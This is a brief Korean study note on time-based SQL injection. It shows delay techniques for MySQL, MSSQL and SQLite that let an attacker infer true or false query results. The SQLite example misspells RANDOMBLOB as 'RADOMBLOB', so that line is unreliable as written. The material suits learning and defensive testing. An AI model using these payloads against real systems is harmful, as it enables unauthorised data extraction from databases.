## Time based SQL Injection
### Time based SQL Injection
---
시간 지연을 이용해 쿼리의 참/ 거짓 여부를 판단하는 공격 기법이다. 시간을 지연시키는 방법은 DBMS에서 제공하는 함수를 사용하거나, 헤비 쿼리를 사용한다. 
#### MySQL 공격
```sql
SELECT SLEEP(1);
SELECT BENCHMARK(40000000, SHA1(1));
```
#### MSSQL 공격
```sql
SELECT '' if ((select 'abc') = 'abc') waitfor delay '0:0:1';
```
#### SQLite 공격
```sql
.timer ON
SELECT LIKE('ABCDEFG', UPPER(HEX(RADOMBLOB(1500000000/2))));
